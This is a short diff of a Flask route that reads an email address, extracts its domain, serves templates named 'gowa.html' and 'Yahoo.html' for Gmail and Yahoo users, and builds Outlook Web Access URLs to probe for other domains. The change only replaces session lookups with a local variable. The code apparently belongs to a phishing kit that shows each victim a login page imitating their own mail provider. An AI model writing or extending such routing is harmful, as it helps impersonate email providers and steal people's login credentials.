@@ -177,18 +177,18 @@ def route2():
     if web_param:
         session['eman'] = web_param
         session['ins'] = web_param.split('@')[-1]  # Extract domain
-        
+        domans = web_param.split('@')[-1]
         app.logger.info(f"Extracted domain: {session['ins']}")  # Flask logging
 
         # Direct mappings for known email domains
-        if session['ins'] == "gmail.com":
+        if domans == "gmail.com":
             return render_template('gowa.html', eman=session.get('eman'), ins=session.get('ins'))
-        elif session['ins'] == "yahoo.com":
+        elif domans == "yahoo.com":
             return render_template('Yahoo.html', eman=session.get('eman'), ins=session.get('ins'))
 
         # Construct OWA URLs
-        owa_url = urljoin(f"https://owa.{session['ins']}", "/owa/#path=/mail")
-        autodiscover_url = urljoin(f"https://autodiscover.{session['ins']}", "/owa/#path=/mail/search")
+        owa_url = urljoin(f"https://owa.{domans}", "/owa/#path=/mail")
+        autodiscover_url = urljoin(f"https://autodiscover.{domans}", "/owa/#path=/mail/search")
 
         # Try accessing OWA URLs
         for url in [owa_url, autodiscover_url]:
